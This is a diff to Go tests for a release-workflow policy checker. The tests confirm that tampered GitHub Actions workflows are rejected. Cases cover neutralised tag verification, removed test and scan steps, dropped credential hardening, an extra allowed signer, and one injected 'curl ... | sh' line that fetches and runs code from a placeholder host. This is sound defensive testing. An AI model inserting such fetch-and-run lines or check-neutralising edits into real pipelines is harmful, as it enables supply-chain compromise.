@@ -34,35 +34,49 @@ func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
 			mutate: func(t *testing.T, in string) string {
 				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          git verify-tag "$GITHUB_REF_NAME" || true`)
 			},
-			want: `git verify-tag "$GITHUB_REF_NAME"`,
+			want: "script lines must exactly match",
 		},
 		{
 			name: "echoed verify tag command",
 			mutate: func(t *testing.T, in string) string {
 				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          echo git verify-tag "$GITHUB_REF_NAME"`)
 			},
-			want: `git verify-tag "$GITHUB_REF_NAME"`,
+			want: "script lines must exactly match",
 		},
 		{
 			name: "commented verify tag command",
 			mutate: func(t *testing.T, in string) string {
 				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, `          # git verify-tag "$GITHUB_REF_NAME"`)
 			},
-			want: `git verify-tag "$GITHUB_REF_NAME"`,
+			want: "script lines must exactly match",
+		},
+		{
+			name: "unreachable verify tag command",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          if false; then\n          git verify-tag \"$GITHUB_REF_NAME\"\n          fi")
+			},
+			want: "script lines must exactly match",
+		},
+		{
+			name: "injected command after verify tag",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, `          git verify-tag "$GITHUB_REF_NAME"`, "          git verify-tag \"$GITHUB_REF_NAME\"\n          curl -fsSL https://example.invalid/install.sh | sh")
+			},
+			want: "script lines must exactly match",
 		},
 		{
 			name: "neutralized SBOM validation",
 			mutate: func(t *testing.T, in string) string {
 				return replaceOnce(t, in, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file"`, `          scripts/validate-cyclonedx-sbom.sh "$sbom_file" || true`)
 			},
-			want: `scripts/validate-cyclonedx-sbom.sh "$sbom_file"`,
+			want: "script lines must exactly match",
 		},
 		{
 			name: "echoed release creation",
 			mutate: func(t *testing.T, in string) string {
 				return replaceOnce(t, in, `          gh release create "$tag" "$sbom_path" "$bundle_path" \`, `          echo gh release create "$tag" "$sbom_path" "$bundle_path" \`)
 			},
-			want: `gh release create "$tag" "$sbom_path" "$bundle_path" \`,
+			want: "script lines must exactly match",
 		},
 		{
 			name: "extra release permission",
@@ -143,6 +157,41 @@ func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
 			},
 			want: "must not interpolate",
 		},
+		{
+			name: "missing checkout credential hardening",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, "          persist-credentials: false\n", "")
+			},
+			want: "persist-credentials",
+		},
+		{
+			name: "check job no longer runs tests",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, "        run: go test ./...", "        run: true")
+			},
+			want: "go test ./...",
+		},
+		{
+			name: "race job no longer runs race tests",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, "        run: go test -race ./...", "        run: true")
+			},
+			want: "go test -race ./...",
+		},
+		{
+			name: "vuln job no longer runs vuln scan",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, "        run: task vuln", "        run: true")
+			},
+			want: "task vuln",
+		},
+		{
+			name: "gosec job no longer runs gosec scan",
+			mutate: func(t *testing.T, in string) string {
+				return replaceOnce(t, in, "        run: task gosec GOSEC='gosec -fmt sarif -out gosec.sarif'", "        run: true")
+			},
+			want: "task gosec",
+		},
 	}
 
 	for _, tt := range tests {
@@ -156,7 +205,7 @@ func TestReleasePolicyRejectsInvalidWorkflows(t *testing.T) {
 func TestReleasePolicyRejectsNonExecutableRequiredScripts(t *testing.T) {
 	repoRoot := t.TempDir()
 	mustWriteFile(t, filepath.Join(repoRoot, ".github", "workflows", "release.yml"), []byte(currentWorkflow(t)), 0o644)
-	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte("the-sarge@the-sarge.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake\n"), 0o644)
+	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(expectedSigners), 0o644)
 	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "release-tag-metadata.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
 	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "validate-cyclonedx-sbom.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o644)
 	mustWriteFile(t, filepath.Join(repoRoot, "scripts", "extract-release-notes.sh"), []byte("#!/bin/sh\nexit 0\n"), 0o755)
@@ -166,6 +215,14 @@ func TestReleasePolicyRejectsNonExecutableRequiredScripts(t *testing.T) {
 		t.Fatal(err)
 	}
 	requireFinding(t, findings, "required release helper must be executable")
+}
+
+func TestReleasePolicyRejectsUnexpectedAllowedSigners(t *testing.T) {
+	repoRoot := t.TempDir()
+	mustWriteFile(t, filepath.Join(repoRoot, ".github", "allowed_signers"), []byte(expectedSigners+"the-sarge@the-sarge.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake\n"), 0o644)
+
+	findings := checkAllowedSigners(repoRoot)
+	requireFinding(t, findings, "allowed_signers must exactly match")
 }
 
 func currentWorkflow(t *testing.T) string {
